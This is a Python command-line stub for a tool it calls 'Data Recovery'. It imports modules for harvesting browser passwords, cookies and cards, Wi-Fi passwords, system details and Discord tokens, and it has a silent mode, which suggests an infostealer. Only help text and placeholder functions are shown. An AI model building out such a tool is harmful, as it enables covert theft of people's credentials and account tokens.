import sys
from config import Constant
from config import Colors
from modules import (ChromiumRecovery, WebHistoryRecovery, WebBookmarksRecovery,
                     NetworkInfoRecovery, WifiPasswordRecovery,
                     SystemInfoRecovery, DiscordRecovery)

class Args:
    browser_passwords = False
    browser_history = False
    browser_bookmarks = False
    network_wifi = False
    network_info = False
    system_all = False
    applications_discord = False

args = Args()

def parser():
    __help_message = r"""
    usage: [-h] [--silent] [--verbose] [--log] [--all] [--browser-all] [--browser-passwords] [--browser-history] [--browser-bookmarks] [--network-all] [--network-wifi] [--network-info] [--system-all]

    Data Recovery | 

    options:
      -h, --help            show this help message and exit
      --silent, -s          Silent Mode - No Console Output
      --verbose, -v         Verbose - Display everything that happens
      --log, -l             Log to file
      --all, -a             Get All Information
      --browser-all, -ba    Get Browser Passwords, Cookies, Cards and History and Bookmarks
      --browser-passwords, -bp
                            Get Browser Passwords, Cookies, Cards and History DB File
      --browser-history, -bh
                            Get Browser History
      --browser-bookmarks, -bb
                            Get Browser Bookmarks
      --network-all, -na    Get All Network Information and Wifi Passwords
      --network-wifi, -nw   Get Wifi Passwords
      --network-info, -ni   Get All Network Information
      --system-all, -sa     Get All Network Information and Wifi Passwords
      --apps-discord, -ad   Get Discord Tokens of Logged in Accounts
    """

    argsv = sys.argv[:]

    if ("--help" in argsv) or ("-h" in argsv):
        print(__help_message)
        sys.exit()

    # Your argument parsing logic here...

def cexit():
    # Your exit logic here...
    sys.exit()
